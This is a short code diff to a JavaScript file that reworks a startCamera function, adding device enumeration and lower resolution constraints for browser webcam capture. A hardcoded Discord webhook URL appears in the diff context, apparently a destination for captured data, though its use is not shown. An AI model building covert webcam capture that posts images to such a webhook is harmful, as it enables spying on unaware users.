@@ -17,15 +17,24 @@ const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/126913907004762119
 
 async function startCamera() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                aspectRatio: { ideal: 16 / 9 }
-            }
-        });
-        video.srcObject = stream;
-        video.setAttribute('crossorigin', 'anonymous');
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        
+        if (videoDevices.length > 0) {
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    aspectRatio: { ideal: 16 / 9 }
+                }
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            video.setAttribute('crossorigin', 'anonymous');
+        } else {
+            console.error("No video devices found.");
+        }
     } catch (error) {
         console.warn("Preferred constraints failed, falling back to default constraints:", error);
         try {
